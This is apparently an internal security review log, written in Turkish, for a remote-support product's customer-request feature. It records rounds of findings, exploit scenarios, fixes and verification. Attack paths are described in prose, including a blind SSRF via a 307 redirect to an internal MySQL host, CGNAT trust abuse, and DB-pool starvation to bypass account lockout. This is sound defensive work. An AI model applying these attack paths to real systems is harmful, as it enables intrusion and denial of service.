#### G-E9-15 [ORTA] "Bilinen ağ" sinyali /24 ve /48 ile çok kaba; uyarıyı susturuyor ve hız ayrıcalığı veriyor (A04/A07)
Yer: mimari-e9 §13.1 (`network` sinyali: `netKey()` IPv4 /24, IPv6 /48, son 90 gün); §13.6 ("≥ 40 iken yalnız bilinen", "bilinen kaynak tavanı 120/sa"); mimari-api POST `/public/requests` sırası.
Sorun: Mobil operatörlerin CGNAT'ı ve ev ISS'lerinin havuzları IPv4 /24'ü binlerce aboneyle paylaşır. ISS'ler müşteriye genelde /56 verdiği için IPv6 /48 de ~256 aboneyi kapsar. Tenant'ın tek bir müşterisi 90 gün içinde bu havuzdan oturum yaptıysa, aynı havuzdaki herkes "bilinen ağ" sayılır. Bunun iki etkisi var:
(1) "İlk kez görülen kaynak" uyarı rozeti kalkar ve yerine güven veren "Bu ağdan daha önce oturum yapıldı" yazısı gelir. Bu, G-E9-1 önleminin teknisyen üzerindeki etkisini zayıflatır.
(2) G-E9-7 için konan "yeni kaynak eşiği" (≥ 40) ve tenant kovası muafiyeti (120/sa) böyle bir havuzdaki saldırgana da açılır.
İstismar senaryosu: Saldırgan, tenant müşterilerinin yaygın kullandığı bir mobil operatörden bağlanır ve IP yenileyerek bilinen bir /24'e düşer. Talebi "bilinen ağ" rozetiyle gelir; teknisyen kodu sormadan kabul etmeye daha yatkın olur. Saldırgan birkaç bilinen önekten kuyruğu 50'ye doldurup gerçek yeni müşterileri `QUEUE_FULL` ile dışarıda bırakır.
Düzeltme (mimar → backend/frontend, P8b-1):
- Panelde güven veren `network` rozeti yalnız şu iki durumda gösterilir: güvenilen CIDR eşleşmesi, ya da **tam ipKey** (IPv4 /32, IPv6 /64) eşleşmesi. /24 ve /48 eşleşmesi gösterilecekse nötr metinle gösterilir ("Benzer ağdan önceki oturum var"), "İlk kez görülen kaynak" uyarısını kaldırmaz.
- Hız ve kuyruk ayrıcalıkları (≥ 40 eşiği, 120/sa) yalnız güvenilen CIDR'ye ve `known_device`'a verilir; `net_key` eşleşmesi tek başına yetmez.
- Kılavuzda şu açıkça yazılır: "Rozet ne olursa olsun kayıtlı numaradan arayıp kodu sorun."
- AC-143 ve AC-146 metinleri buna göre güncellenir.

#### G-E9-16 [DÜŞÜK] Güvenilen CIDR muafiyeti eşzamanlı `/ws/request` sınırını (ipKey ≤ 5) kapsamıyor
Yer: mimari-e9 §13.6 (muaf listesi) ile §13.7 G-E9-9 / protokol §5 "ipKey başına eşzamanlı ≤ 5"
Sorun: Güvenilen CIDR'deki NAT ofisi bekleyen sınırından muaf, ama bekleyen 6. talebin soketi upgrade'de 429 alır. Talep oluşur, istemci ise kuyruğa bağlanamaz ve 120 sn sonra DISCONNECTED olur. Bu bir istismar değil; G-E9-7'nin NAT ofisi hedefini sessizce bozuyor.
Düzeltme: Güvenilen CIDR kaynakları eşzamanlı soket sınırından da muaf tutulur (tenant 50 tavanı sınırlamayı zaten yapıyor), ya da sınır ipKey başına bekleyen sınırıyla hizalanır. Atanan: mimar, backend.

#### G-E9-17 [DÜŞÜK] `known_device` bir kez kazanılınca kalıcı; geri alma yolu yok
Yer: mimari-e9 §13.1 `device` sinyali
Sorun: Saldırganın kendi makinesi tek bir kabul edilmiş oturumdan sonra (sosyal mühendislik ya da işten ayrılmış bir çalışan) süresiz olarak "Bu bilgisayar daha önce destek aldı" rozeti ve G-E9-15 düzeltmesiyle hız ayrıcalığı alır.
Düzeltme: Sinyal de 90 günlük pencereyle sınırlanır. Panelde talep veya oturum detayından "Bu cihazı güvenilir sayma" (device_hash kara listesi, audit'li) eklenir, ya da bu iş Sonra listesine yazılır. Atanan: mimar, backend.

### Otomatik tarama
Tasarım turu, yeni kod yok. Tur 1'den sonra değişen belgelerde gizli bilgi kalıbı yok.

### Olumlu
- r2 bütün maddeleri P8b-1 ve P8b-2'ye bağladı; "Sonra"ya kaçırılan Orta veya Yüksek madde yok.
- Onay akışı P7 diyalog kurallarıyla aynı. İptal ve kabul yarışı tek sonuca (CANCELLED) indirgendi.
- WhatsApp kanalında kişisel veri yok ve kanal fail-closed. Gönderim sınırları alıcı, tenant ve sistem genelinde üç katmanlı.
- Değişiklikler ADR, API, protokol ve AC belgelerinin hepsine tutarlı biçimde işlendi.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
G-E9-15 P8b-1 kodlamasıyla birlikte ele alınmalı (yalnız rozet ve muafiyet kuralı değişiyor, şema aynı kalıyor). G-E9-16 ve G-E9-17 P8b-1 içinde ya da "Sonra" olarak eklenebilir. K13 doğrulaması P13 prod kontrol listesine yazılmalı.

DURUM: GEÇTİ (Kritik 0 / Yüksek 0 / Orta 1 / Düşük 2) — P8b-1 kodlamasına geçilebilir.

---

## P8b-1 — Tur 1 — Müşteri destek talebi (E9) kod denetimi (2026-11-12)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 4 (S8b-1..4)

Kapsam: `apps/server/src/requests/*`, `notify/whatsapp.ts`, `lib/version.ts`, `lib/ip.ts`, `signaling/{rooms,admit,ws,handlers}.ts` (ön-kabullü /ws/guest),
`sessions/history.ts` (talep bloğu ve CSV), `packages/contracts/src/{api/requests.ts,ws-request.ts}`, `deploy/Caddyfile`, `deploy/nginx/*`.

### Bulgular

#### S8b-1 [DÜŞÜK] WhatsApp istemcisi yönlendirmeleri izliyor (A10 SSRF, fail-closed delinmesi)
Yer: `apps/server/src/notify/whatsapp.ts:243`
Sorun: `fetch` çağrısında `redirect` belirtilmemiş; varsayılan `follow`. Servis kimliksiz ve düz HTTP. Ele geçirilmiş servis ya da yoldaki bir MITM 307/308 döndürürse aynı POST gövdesi (alıcı numarası, şablon) yönlendirilen adrese tekrar gönderilir. Bu adres iç ağ (`server`/`mysql` docker ağı, metadata) veya `https`'ten `http`'ye düşen bir adres olabilir. URL env'den geldiği için tenant bu adresi değiştiremez (T33 sağlam). Fakat §13.5'teki fail-closed kuralı yalnız ilk URL'yi denetliyor.
Senaryo: Staging'deki varsayılan `http://89.252.189.211:3000` yolunda bir saldırgan `307 Location: http://mysql:3306/` ya da başka bir iç adres döndürür. Sunucu, iç ağa saldırgan seçimi bir hedefe istek atan bir aracıya dönüşür (kör SSRF).
Öneri: `fetch(..., { redirect: "error" })` (veya `"manual"` ve 3xx'i hata say). Birim testi: 307 → `fail`, ikinci istek atılmıyor.
Atanan: backend-dev

#### S8b-2 [DÜŞÜK] Ön-kabullü misafirde eşzamanlı iki /ws/guest bağlantısı ortak `guest.peer`'ı eziyor (A04, kendi oturumunu bozma)
Yer: `apps/server/src/signaling/ws.ts:145-148`, `apps/server/src/signaling/admit.ts:107-125`
Sorun: `room.admitting = true` ancak `await rooms.db.user.findUnique(...)` sonrasında set ediliyor (admit.ts:107 kontrolü ile 124 ataması arasında await var). Ayrıca her bağlantı `g.peer = peer` ile aynı misafir nesnesini eziyor. Sıra şöyle: A ticket'ı (gen1) ile bağlanır → /ws/request yeniden bağlanır, gen2 verilir → B, gen2 ile bağlanır. İkisi de admit'e girer. A TX'i kazanır, B kaybeder. Kaybedenin `endGuest` adımı `guest.peer`'ı, yani B'yi kapatır. Sonrasında `room.admitted = guest` ölü peer'a işaret eder, A'nın soketi ise yetim kalır. Tenant sınırı veya yetki aşılmıyor. Bunu yalnız talep sırrının sahibi (müşterinin kendisi) tetikleyebilir. Sonuç: oturum bağlanmış görünür ama medya/kontrol akmaz, teknisyen-yok/aktif zamanlayıcıları belirsiz duruma girer.
Öneri: `admitting` bayrağını ilk `await`'ten önce set edin (veya ön-kabullü misafirde tek uçuşlu kilit kullanın). `g.peer` yalnız admit kazanılınca atansın. Kaybeden bağlantı yalnız kendi peer'ını kapatsın (`endGuest`'e peer parametresi geçin).
Atanan: backend-dev

#### S8b-3 [DÜŞÜK] `request.created` audit'i müşteri IP'sini JSON'a ikinci kez yazıyor; talep anonimleştirmesi audit'i kapsamıyor (A09/KVKK)
Yer: `apps/server/src/requests/service.ts:243`
Sorun: `newValue: { ip: ctx.ip, ... }`. IP zaten audit'in `ip_address` sütununda var. Talep anonimleştirmesi (AC-159, `repo.ts:264-271`) `support_requests.ip/ip_key/net_key` alanlarını boşaltıyor. Audit ise 730 gün tutuluyor, dolayısıyla IP orada kalıyor. Bu tek başına bir ihlal değil (audit IP'si ortak standart), ama alan gereksiz yere çiftleniyor.
Öneri: `newValue`'dan `ip` çıkarılsın; `clientVersion` kalsın.
Atanan: backend-dev

### Doğrulanan kontroller (bulgu yok)
- **Public uçlar:** girdi şemaları `strictObject` ve hepsinde uzunluk sınırı var. Ad/açıklama için Cc/Cf (bidi, sıfır genişlik) yasak, açıklama tek satıra indiriliyor, telefon E.164'e normalize ediliyor. bodyLimit 8 KB / 1 KB. AGENT kuralı `checkPublicClient` ile POST/cancel'da ve `/ws/request` upgrade'inde uygulanıyor.
- **Ref oracle:** biçim dışı, yok, yenilenmiş, pasif tenant ve ayarı olmayan tenant durumlarının hepsi tek `REQUEST_REF_INVALID` yanıtına düşüyor (`service.ts:60,96-100`). Geçersiz ref, ipKey başına 10/dk sayılıyor, ardından 15 dk kilit; ortak kova `/ws/request`'te geçersiz sırrı da sayıyor. Tek zamanlama farkı biçim kontrolünde (DB sorgusu yok); bu da bir bilgi sızdırmıyor. Firma dosyası forward_auth yolu ref + label'ı doğruluyor ve tek 404 dönüyor.
- **XFF (ADR-0015):** nginx XFF'i `$remote_addr` ile yeniden yazıyor. Caddy 4451 yalnız 172.30.0.128'e güveniyor (strict) ve yalnız loopback'e yayımlanıyor. 4450 dinleyicisinde güvenilen proxy yok. server `trustProxy = TRUSTED_PROXY_CIDR` (prod'da zorunlu). WS `clientIp` aynı kuralı izliyor.
- **Talep sırrı ve ticket:** 256 bit; DB'de yalnız SHA-256 tutuluyor; sır yalnız 201 yanıtında ve subprotocol'de taşınıyor, `url.search` doluysa 403. Ticket tek kullanımlık (`take`) ve `requestId`'ye bağlı misafire ait; kuşak (`ticketGen`) yeniden bağlanmada eskisini geçersiz kılıyor. Ticket yalnız sır sahibinin soketine gidiyor; başka talebin sırrı başka satıra çözülüyor. Cancel her durumda 204 dönüyor (oracle yok).
- **Kabul yarışı:** teknisyen `FOR UPDATE` → açık oturum sınırı → `updateMany(id, tenantId, PENDING, expiresAt>now)` tek koşullu; kaybeden `lostRace` sınıflandırmasına düşüyor. İptal ve decline tek TX'te ve koşullu. Oluşturma TX'inin ilk ifadesi ayar satırı kilidi (G-E9-10).
- **Tenant/yetki:** her panel ucunda `requireAuth` (CSRF double-submit + Origin) → `requirePerm` → `tenantScope` (firma seçmemiş Super Admin 403). Sorgular `tenantId` filtreli; başka tenant'ın id'si 404 alıyor. Kabul yalnız kendi tenant'ında (Super Admin kabul edemiyor). `/ws/panel` için Origin allowlist, çerez, `support_requests.view` ve acting tenant şartı var; hub anahtarı soket bağlamından geliyor; 60 sn'de bir yeniden doğrulama yapılıyor; istemciden gelen mesaj 1008 ile kapanıyor.
- **Caps / P7:** caps admit anında DB'deki etkin yetkiden hesaplanıyor (`admit.ts:121,151`). Pasif teknisyen/tenant → `auth_revoked`. Talep oturumunda lobi/admit mesajı reddediliyor. P7 kapıları değişmedi.
- **XSS/CSV:** panel bileşenlerinde `dangerouslySetInnerHTML`/linkify yok. Tek `href`'ler sabit iç rotalar. CSV formül kaçışı (S8-1 kalıbı) ad ve not hücrelerine uygulanıyor. Ret mesajı URL/e-posta/telefon süzgecinden geçiyor ve WS'de düz metin.
- **WhatsApp:** URL yalnız env'den geliyor. Şablon firma adı + 6 haneli kod + sabit panel bağlantısından oluşuyor (müşteri verisi yok). `attachments` gönderilmiyor. Prod'da http + genel adres → kanal kapalı, test 502. Sınırlar tenant 30, alıcı 10, global 300/sa. Audit'te numara maskeli (S8b-1 hariç).
- **Log maskeleri:** pino `*.requestSecret`, `*.wsTicket`, `*.deviceKey`, `*.ref`, `sec-websocket-protocol` redakte ediliyor; URL sorgu dizesi yazılmıyor. Caddy (erişim + varsayılan logger) ve nginx `NoktaDestek-***` maskesini uyguluyor, subprotocol/çerez siliniyor. Audit `MASKED_KEY` `code|ticket|key` kalıplarını kapsıyor.
- **MIN_AGENT_VERSION:** oluşturma, `/ws/request` ve `/ws/guest` (ticket'taki sürüm) yollarında 426 dönüyor.

#### S8b-4 [DÜŞÜK] Yeni test dosyası CI gitleaks'ini kıracak (süreç)
Yer: `apps/server/test/integration/requests-p8b-4.test.ts:147,176`
Sorun: `deviceKey` (iki sabit, alıntı gitleaks nedeniyle redakte edildi) test sabitleri `generic-api-key` kuralına takılıyor (`dir` taraması 2 eşleşme). Gerçek sır değil, ama dosya commit edilince CI gitleaks adımı kırmızıya düşer.
Öneri: Sabitleri kuralın yakalamayacağı bir biçimde üretin (ör. `"d".repeat(22)` ya da yardımcı bir `fakeDeviceKey()`) veya `.gitleaks.toml`'a yalnız bu yol ve satır için dar bir allowlist ekleyin.
Atanan: backend-dev

### Otomatik tarama çıktıları
- `pnpm audit --audit-level high`: **No known vulnerabilities found**.
- gitleaks v8.30.1 `git` modu (18 commit): **no leaks found**.
- gitleaks `dir` modu (çalışma ağacı): 15 eşleşme. Bunların 13'ü `apps/web/.next/**` derleme çıktısı (preview/prerender anahtarları; repoda yok, `.gitignore`'da) ve gürültü olarak yok sayıldı. Kalan 2 eşleşme S8b-4.
- `.env` geçmişi: git geçmişinde yalnız `.env.example` var.
- Grants: `support_requests` ve `tenant_request_settings` için `app` kullanıcısına SELECT/INSERT/UPDATE veriliyor; DELETE/ALTER/DROP/INDEX/TRIGGER/REFERENCES REVOKE ediliyor. Anonimleştirme UPDATE ile yapıldığı için en az yetkiyle tutarlı.

### Tasarımda vaat edilip kodda bulunmayanlar
Yok. G-E9-1..17 kararlarının kod karşılıkları doğrulandı: kod/rozet, caps DB'den, onay tazeliği (istemci), MIN_AGENT_VERSION, kişisel verisiz şablon, /48 + `net_key` bekleyen sınırı, nginx/Caddy maskeleri, REDACT_PATHS, TX sırası, label+ref doğrulaması, ret süzgeci, `closeByUser`/`closeByAuthToken`, known_device ayrıcalığı, güvenilen CIDR'in soket sınırından muafiyeti.

### Olumlu
Kodda tek 404 yolu, tek kullanımlık ve kuşaklı ticket, koşullu UPDATE durum makinesi, commit sonrası bellek yan etkileri, sabit kalıplı strict şemalar ve log ile audit maskesinin birlikte uygulanması dikkat çekiyor. Tenant izolasyonu her sorguda arka uçta sağlanıyor.

Karar: Kritik/Yüksek bulgu yok → **GEÇTİ**. S8b-1..4 (Düşük) P8b-1 düzeltme turunda kapatılabilir. Aksi halde `docs/gereksinimler.md` §9'a "Sonra" olarak yazılmalı. S8b-4 commit öncesi yapılmalı (CI).

---

## P8b-1 — Tur 2 — Düzeltme doğrulaması (2026-11-12)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (S8b-5, S8b-6, ikisi de yeni). S8b-1..4 KAPANDI.

Kapsam: `docs/implementation.md` "Backend P8b-1 — düzeltme turu 1": `notify/whatsapp.ts`, `signaling/{admit,ws}.ts`, `requests/{service,routes,panel}.ts`, `lib/{db,errors}.ts`, `test/integration/requests-p8b-4.test.ts`, `auth/service.ts` (503 dönüşümünün giriş akışına etkisi).

### Tur 1 bulgularının durumu
| Bulgu | Durum | Kanıt |
|---|---|---|
| S8b-1 SSRF / redirect | KAPANDI | `notify/whatsapp.ts:243` `redirect: "error"`. `FetchLike` tipi (`:24`) alanı zorunlu tutuyor, dolayısıyla enjekte edilen fetch de bu seçeneği alıyor. `security-p8b-fix1.test.ts`: 307 → başarısız, hedefe ikinci istek gitmiyor. |
| S8b-2 admitting/peer yarışı | KAPANDI | `admit.ts:111-120`: `room.admitting` ilk `await`'ten önce kuruluyor; yinelenen bağlantı yalnız kendi soketini 1008 `conflict` ile kapatıyor. `admit.ts:168`: `guest.peer` yalnız kazanınca atanıyor. `ws.ts:146-148`: upgrade'de peer atanmıyor. `admit.ts:177`: admit sırasında kapanan soket `detachGuest` ile ayrılıyor. Ret ve zaman aşımı (`endGuest`) yalnız kendi peer'ına gidiyor. `finally` bayrağı her yolda sıfırlıyor. |
| S8b-3 audit'te IP | KAPANDI | `requests/service.ts:254`: `newValue = { clientVersion }`; IP yalnız `ip_address` sütununda. |
| S8b-4 gitleaks | KAPANDI | `requests-p8b-4.test.ts:15` `fakeDeviceKey()` çalışma anında `randomBytes` ile üretiliyor. `dir` taramasında bu dosyadan eşleşme yok. |

### Ek değişikliklerin incelemesi (bulgu yok)
- **503 NOT_READY + Retry-After (`lib/errors.ts`):** Gövde sabit (`code/message/requestId`); SQL, stack ve Prisma mesajı yok. Log'a yalnız `alarm` ve `code` yazılıyor. `isTransientDbError` (`db.ts:37-44`) yalnız `PrismaClient*` adlı hataları ve sabit kod kümesini (P2028/P2034, 1205/1213/45028) kabul ediyor; diğer hatalar 500 `INTERNAL` olarak kalıyor. **Oracle:** ref geçersiz, biçim ve consent yolları TX'ten önce 4xx dönüyor; 503 yalnız ref geçerliyken ve TX'te oluşuyor, yani Tur 1'de kabul edilenin ötesinde ayrım sağlamıyor. Girişte başarı TX'i ile başarısızlık TX'i aynı çekişmeden etkileniyor. Bu yüzden 503, "şifre doğru" ile "şifre yanlış" arasında deterministik bir ayrım vermiyor. Talepte TX geri alındığı için yeniden deneme güvenli. Tenant kovası TX'ten önce sayıldığından 503 limit atlatmaya yol açmıyor.
- **AC-147 (`requests/routes.ts:38,55,62`):** accept ve reject `[view, accept]` preHandler dizisini kullanıyor.
- **AC-148 (`requests/panel.ts:147`):** `rejectRequest` içinde `auth.user.tenantId !== tenantId` → 403, kontrol `acceptLimit`'ten ve TX'ten önce yapılıyor.
- **`guest.admitted` (`admit.ts:149`):** `{via, requestId, acceptedBy, guestKind, consentTextId, consentSha256}`. Ad, telefon ve IP içermiyor; IP yalnız sütunda.
- **`request.rate_limited`:** kova ve anahtar türü ayrıştı (`pending.ip` / `pending.prefix` / `pending.tenant`); değer olarak anahtarın kendisi yazılmıyor.

### Bulgular

#### S8b-5 [DÜŞÜK] Seri talep TX'leri ortak bağlantı havuzunu 20 sn'ye kadar tutabiliyor (A04, kaynak tükenmesi)
Yer: `apps/server/src/lib/db.ts:20-27`, `apps/server/src/requests/service.ts:210-256`
Sorun: `SERIAL_TX_OPTIONS` (maxWait 20 sn, timeout 30 sn) ve `acquireTimeout` 20 sn ile her eşzamanlı `POST /public/requests` bir havuz bağlantısı alıyor, ardından `tenant_request_settings … FOR UPDATE` kilidinde bekliyor. Havuz 10 bağlantılık ve panel, giriş ve WS admit ile ortak. Uygulama içinde tenant başına bir eşzamanlılık sınırı yok.
İstismar senaryosu: Geçerli ref'e sahip (firma dosyasını indirmiş) bir saldırgan, IP başına kovaları aşmamak için çok sayıda IP'den aynı anda onlarca talep gönderir. Tenant kovası saatte 60 bilinmeyen kaynakla sınırlı. Ref'ler birden çok firmadan toplanırsa bu sayı katlanır. DB yavaşken havuzun tamamı kilit kuyruğunda bekler ve tüm firmaların panel/giriş istekleri 8–20 sn bekleyip 503 alır. Etki geçici, veri bütünlüğü bozulmuyor. Eski 2 sn varsayılanında da aynı açlık vardı ama daha kısa sürüyordu.
Düzeltme: TX'ten önce süreç içi tenant başına tek uçuşlu kuyruk/semafor (ör. tenant başına en çok 1–2 bekleyen TX, fazlası kısa `maxWait` ile 503) veya talep oluşturma için ayrı küçük bir havuz. `rs_db_busy_total` metriğine alarm eşiği. (atanan ajan: backend-dev; metrik/alarm devops)

#### S8b-6 [DÜŞÜK] Geçici DB hatasında başarısız giriş sayacı artmıyor (A07, hesap kilidi fail-open) — önceden vardı, 503 dönüşümüyle görünür oldu
Yer: `apps/server/src/auth/service.ts:50-61` (`recordFailure`), `:88-92`
Sorun: Hesap düzeyindeki kilit (`bumpAccountFailures`) ve `auth.login fail` audit'i aynı TX'te yapılıyor. TX P2028/1205 ile düşerse sayaç artmıyor, audit yazılmıyor ve istemci 503 alıyor. Bellek içi IP ve (login, IP) kovaları ayakta, ama dağıtık denemeye karşı tek koruma olan hesap kilidi bu anlarda sayılmıyor.
İstismar senaryosu: Saldırgan DB'yi meşgul tutar (ör. S8b-5) ve aynı anda çok IP'den tek bir hesaba şifre dener. Çekişmeye denk gelen yanlış denemeler sayılmaz ve audit'te iz bırakmaz. Doğru şifre çekişme olmayan bir anda 200 döner. Etki düşük: IP başına kova yine geçerli ve çekişme penceresi dar.
Düzeltme: Başarısızlıkta geçici DB hatası alınırsa kayıtlı kullanıcı için de bellek içi bir hesap kovası (`ghostAccount` kalıbı) artırılsın, `auth.login fail` en az log'a yazılsın (`alarm:"auth_fail_unrecorded"`). Ya da sayaç artışı TX dışında, tek bir atomik `UPDATE` olarak yapılsın. (atanan ajan: backend-dev)

### Otomatik tarama çıktıları
- `pnpm audit --audit-level high`: **No known vulnerabilities found**.
- gitleaks v8.30.1 `git` modu: 18 commit tarandı, **no leaks found**.
- gitleaks `dir` modu: 13 eşleşme, hepsi `apps/web/.next/**` (`generic-api-key`, derleme çıktısı, `.gitignore`'da). Gürültü olarak yok sayıldı. Kaynak/test dosyalarında eşleşme yok (Tur 1'deki 2 eşleşme kapandı).

### Tasarımda vaat edilip kodda bulunmayanlar
Yok. `mimari-api.md` hata tablosuna `NOT_READY` (503 + Retry-After) eklendi; kod ile sözleşme uyumlu.

### Olumlu
Yarış düzeltmesi bayrağı ilk await'ten önce kuruyor ve peer sahipliğini kazanana bağlıyor; kaybeden bağlantı oturuma dokunmuyor. Geçici DB hataları 500'den ayrıştırıldı ve bunu yaparken yanıt gövdesine ayrıntı sızdırılmadı. Yeni deterministik güvenlik testleri (`security-p8b-fix1.test.ts`, `db-busy-p8b.test.ts`) eklendi.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. S8b-5 ve S8b-6 (Düşük) `docs/gereksinimler.md` §9'a "Sonra" olarak eklenmeli; S8b-5'in P13 prod öncesinde ele alınması önerilir.

---

# Güvenlik Raporu — P8b-1 — Tur 3
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (yeni) — S8b-5 ve S8b-6 KAPANDI

Kapsam: "Backend P8b-1 — düzeltme turu 2" (`docs/implementation.md`): `lib/gate.ts`, `requests/service.ts`, `auth/service.ts`, `auth/repo.ts`, `lib/rate.ts`, `apps/web/lib/control/machine.ts`.

## Önceki bulguların doğrulaması
- **S8b-5 KAPANDI.** `lib/gate.ts` incelendi.
  - Sınırlar: anahtar başına 2, toplam 4 eşzamanlı; kuyruk anahtar başına 16, toplam 64; bekleme süresi 5 sn (`requests/service.ts:39`).
  - Kuyruk dolunca istek hemen `full` ile reddediliyor (`gate.ts:77`). Bekleyen iş DB bağlantısı tutmuyor.
  - `run` her durumda `finally` ile kapıyı bırakıyor (`gate.ts:55-59`). Zaman aşımı bekleyeni kuyruktan çıkarıyor (`gate.ts:82-85`). Başlatılan bekleyenin zamanlayıcısı temizleniyor (`gate.ts:109`).
  - Sayaç Map'leri sıfıra inince siliniyor (`gate.ts:95-97`, `102-104`). Bellek 64 bekleyen + 4 çalışan ile sınırlı; sızıntı yok.
  - Anahtar sunucuda çözülen `tenantId`. İstemci bunu seçemiyor; kapıya ulaşmadan önce ref ve IP/önek kovaları uygulanıyor.
  - Tenant saatlik kovası (`count`/`add`) kapının içinde sayılıyor (`service.ts:222-233`). Kapıda reddedilen istek kovayı tüketmiyor.
  - Havuzun en az 6 bağlantısı panel, giriş ve WS admit için kalıyor.
  - Kalan risk (kabul): Bütün tenant'lar 64'lük ortak kuyruğu paylaşıyor. Bu kuyruğu dolduracak kadar yavaş TX üretmek için ayar kilidi tutmak gerekir. Bu da IP/önek kovalarıyla (6/sa/IP, 21/sa/önek) sınırlı.
- **S8b-6 KAPANDI.**
  - `auth/repo.ts:42-52`: Sayaç TX dışında tek atomik `UPDATE` ile artıyor. Kilit koşullu `UPDATE … failed_window_at IS NOT NULL AND count >= limit` ile yazılıyor ve `failed_window_at = NULL` yapıyor. Eşzamanlı isteklerde satırı yalnız biri değiştirebiliyor, bu yüzden tek `auth.locked` yazılıyor.
  - İki UPDATE arasında araya giren artış sorun çıkarmıyor. Kilitten sonra pencere NULL olduğu için sayaç 1'den yeniden başlıyor; hesap zaten kilitli.
  - Sayaç yazılamazsa `fallbackFailure` (`auth/service.ts:57-64`) devreye giriyor. Kovanın kendi eşiği veya "DB sayımı + kova sayımı ≥ 20" koşulu kilitliyor. Kova senkron çalışıyor (yarış yok) ve fail-closed. Birinci UPDATE yazılıp ikincisi düşerse en fazla 1 fazla sayıyor; bu da güvenli yönde.
  - `accountWait` yedek kilidi de hesaba katıyor (`:93-97`). Başarılı girişte kova sıfırlanıyor (`:125`).
  - Kova anahtarı yalnız var olan kullanıcının id'si; saldırgan bu anahtarı seçemiyor. `rate.ts` 50.000 kayıt tavanı ve `block()` içindeki S3-1 kuralı (`rate.ts:95-105`) korunuyor. Sınırsız büyüme yok.
  - Alarm loglarında yalnız userId, kod ve bayraklar var. Login, IP ve şifre yazılmıyor (`:75`, `:88`). Audit hatası artık 503 değil, 401/423 dönüyor.
- **Frontend `machine.ts:224-227`:** `requested` fazında gelen `{VIEW, TECH}` artık yok sayılıyor. Bu yalnız konsolun görünüm durumunu etkiliyor. `requested` fazında giriş olayı gönderilmiyor. Sunucu tarafındaki kontrol kapıları (`signaling/control.ts`) bu turda değişmedi; diff'te yok. Kontrol yine yalnız müşterinin `CONTROL` onayıyla açılıyor. **P7 izin modeli zayıflamadı.** En kötü durumda konsol "bekliyor" göstermeye devam eder (UX), yetki genişlemez.

## Bulgular (öncelik sırasıyla)
### [DÜŞÜK] S8b-7 Kilitli hesap dalında audit yazımı korumasız: DB yazma kesintisinde 401/423 ayrımı yerine 5xx — A09/A04
Yer: `apps/server/src/auth/service.ts:115`
Sorun: Kilitli daldaki `writeAudit(db, …)` çağrısı `recordFailure`'daki gibi try/catch ile sarılmamış. DB yazmaları düşerken kilitli bir hesap 5xx alıyor, kilitli olmayan hesap 401 alıyor. S8b-6 notundaki "durum kodundan sinyal çıkmıyor" iddiası bu dalda geçerli değil.
İstismar senaryosu: Kesinti sırasında saldırgan, hedef hesabın kilitli olup olmadığını (dolayısıyla başkasının saldırı altında olduğunu) yanıt kodundan ayırt eder. Etkisi ve penceresi dar; var olan/olmayan hesap ayrımı bu yolla sızmıyor, çünkü ghost hesap da aynı dalı izliyor.
Düzeltme: Kilitli daldaki audit yazımını da `auth_fail_unrecorded` alarmıyla aynı biçimde try/catch'e alın; yanıt her durumda 423 olsun. Bir test ekleyin. (atanan ajan: backend-dev)

### [DÜŞÜK] S8b-8 IP/önek kovaları kapıdan önce tüketiliyor: kapı 503'ünde yeniden deneyen meşru müşteri saatlik kotasını harcıyor — A04
Yer: `apps/server/src/requests/service.ts:194-196` (kova), `:220` (kapı)
Sorun: `createIp` (6/sa/IP) kapıdan önce sayılıyor. Kapı doluyken dönen 503 + `Retry-After: 5`'e uyan istemci her denemede bu kotayı harcıyor. Kapı birkaç kez dolu kalırsa müşteri bir saatlik 429 bloğuna düşüyor. Benzer şekilde tenant kovası kapı içinde `add` edildikten sonra TX P2024 ile düşerse kova kabul edilmeyen talep için de tüketilmiş oluyor.
İstismar senaryosu: Saldırgan kapıyı yavaş TX'lerle doldurur. Aynı NAT arkasındaki meşru müşteriler otomatik yeniden denemelerle kendi IP kotalarını bitirir ve 1 saat talep açamaz. Bu bir kullanılabilirlik etkisi, yetki ihlali değil.
Düzeltme (P8b-2 istemci yeniden denemesiyle birlikte):
- Kapı reddinde (`GateBusyError`) IP kovasından 1 düşün veya kapı 503'ünü IP kovasında saymayın.
- Ya da istemcide yeniden deneme sayısını 503 başına en çok 2 ile sınırlayın.
- Tenant kovası `add`'ini TX commit sonrasına taşıyın veya hata dalında geri alın.
(atanan ajan: backend-dev; istemci kısmı frontend-dev/agent)

Bilgi (bulgu değil): `gate.ts:72` hızlı yolu kuyruğu kontrol etmiyor; yeni gelen iş bekleyenin önüne geçebiliyor. Bekleyen en geç 5 sn'de zaman aşımına uğrar ve sınırlar korunur, güvenlik etkisi yok. Adillik isteniyorsa `canRun` kuyrukta aynı anahtarın bekleyeni olmamasını da şart koşabilir.

## Otomatik tarama çıktıları
- `gitleaks git` (docker `zricethezav/gitleaks:latest`, `--redact`): **18 commit tarandı, no leaks found**. Yerel `gitleaks` ikili dosyası kurulu değil. Not: git modu commit edilmemiş/izlenmeyen dosyaları (ör. `lib/gate.ts`, `security-p8b-fix2.test.ts`) taramaz.
- Bu dosyalar için şablondaki gizli bilgi regex'i (`api_key|secret|password|token` = 8+ karakter literal) çalıştırıldı: **0 eşleşme**.

## Tasarımda vaat edilip kodda bulunmayanlar
Yok. Kapı ve fail-closed hesap kilidi, implementation notlarında anlatıldığı gibi kodda mevcut.

## Olumlu
- Kapı küçük, bağımlılıksız ve sınırlı belleklidir. Ayrım kanıtı var: kapı 100/100'e açılınca test kırmızıya dönüyor.
- Hesap kilidi DB kesintisinde fail-closed çalışıyor; audit, sayaç yazımından ayrıldı.
- Alarm logları PII içermiyor. 503 yanıtında Retry-After var, SQL/stack yok.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. S8b-7 ve S8b-8 (Düşük) `docs/gereksinimler.md` §9'a "Sonra" olarak eklenmeli. S8b-8 en geç P8b-2'deki istemci yeniden deneme işiyle birlikte ele alınmalı.
